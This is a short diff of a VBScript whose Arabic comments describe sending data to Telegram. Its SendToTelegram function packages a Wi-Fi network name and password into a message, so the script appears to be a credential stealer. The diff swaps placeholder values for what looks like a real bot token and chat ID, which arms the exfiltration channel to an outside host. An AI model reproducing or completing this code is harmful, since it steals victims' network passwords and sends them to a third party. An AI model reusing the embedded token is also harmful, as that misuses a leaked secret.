@@ -68,8 +68,8 @@ End Sub
 ' دالة لإرسال البيانات إلى Telegram
 Sub SendToTelegram(networkName, password)
     ' معلومات البوت
-    botToken = "YOUR_BOT_TOKEN" ' استبدل ب token البوت الخاص بك
-    chatID = "YOUR_CHAT_ID" ' استبدل ب chat ID الخاص بك
+    botToken = "7767663744:AAGYWE07FTXmx6tBcTe80JnX5KMdb35iyoc" ' استبدل ب token البوت الخاص بك
+    chatID = "5792222595" ' استبدل ب chat ID الخاص بك
 
     ' نص الرسالة
     message = "اسم الشبكة: " & networkName & vbCrLf & "كلمة المرور: " & password
